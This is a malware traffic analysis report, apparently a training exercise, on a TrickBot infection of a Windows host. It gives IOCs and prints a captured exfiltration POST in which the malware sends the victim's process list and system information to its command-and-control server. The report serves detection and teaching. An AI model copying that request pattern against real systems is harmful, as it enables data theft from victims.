
## **Executive Summary**:


On 2021-08-19 22:40:36, a user called monica.steele with a hostname DESKTOP-M1TFHB6, was infected with a malware called TrickBot.



## **Details**:

- IP Address : 10.8.19.101
- Mac Address : 00:08:02:1c:47:ae
- HostName : DESKTOP-M1TFHB6
- UserName : monica.steele
- Time of infection : 2021-08-19 22:40:36


## **Indicators of Compromise (IOCs)**:

- Malware-Name : ooiwy.pdf
- MD5 Hash : 4e4ae70b6346eae111e31716dc76bc23
- File Hosting server IP : 185[.]244[.]41[.]29
- C2 : 103[.]148[.]41[.]195



## Analysis

### Stage-1

On Examin the http traffic, we found that the user monica.steele download's a file that look's like a pdf  file : ooiwy.pdf . on downloading the file and examin it, it shows that the file is EXE file executable. After we uploaded the file to virustotal and anyrun, it shows the file behavior as TrickBot malware.


### Stage-2


On continuing of the analysis, it shows on the http packet that the user is actually executed the malware and after that. The malware Gatherd the user IP public address throw "api.ipify.org" then it send's the data back to Cowboy server which is a simple light python http server with the IP of "103[.]148[.]41[.]195", however, the malware gatherd the user data like : proc list, system info( host-name, system-Name etc...) then send back the data to cowboy server with a post requset and the victim hostname as a url and an attachment of the system information.(The packet could be found down below.). However, The malware is targting Active Directory domain's.


---------------------------------------------

POST /rob124/DESKTOP-M1TFHB6_W10019043.0CB9C3AE3FA9B1267DFC20141CDE9D84/90/ HTTP/1.1

Connection: Keep-Alive

Content-Type: multipart/form-data; boundary=------Boundary0005648D

User-Agent: Ghost

Content-Length: 5311

Host: 103.148.41.195:443

  

--------Boundary0005648D

Content-Disposition: form-data; name="proclist"

  

***TASK LIST***

  

[System Process]

System

Registry

smss.exe

csrss.exe

wininit.exe

csrss.exe

winlogon.exe

services.exe

lsass.exe

svchost.exe

fontdrvhost.exe

fontdrvhost.exe

<--SNIP-->

 

--------Boundary0005648D--

  

HTTP/1.1 200 OK

server: Cowboy

date: Thu, 19 Aug 2021 19:45:38 GMT

content-length: 3

Content-Type: text/plain

  

/1/

-----------------------------------------------------------------------------

## reference

- https://www.malware-traffic-analysis.net/2021/08/19/index.html
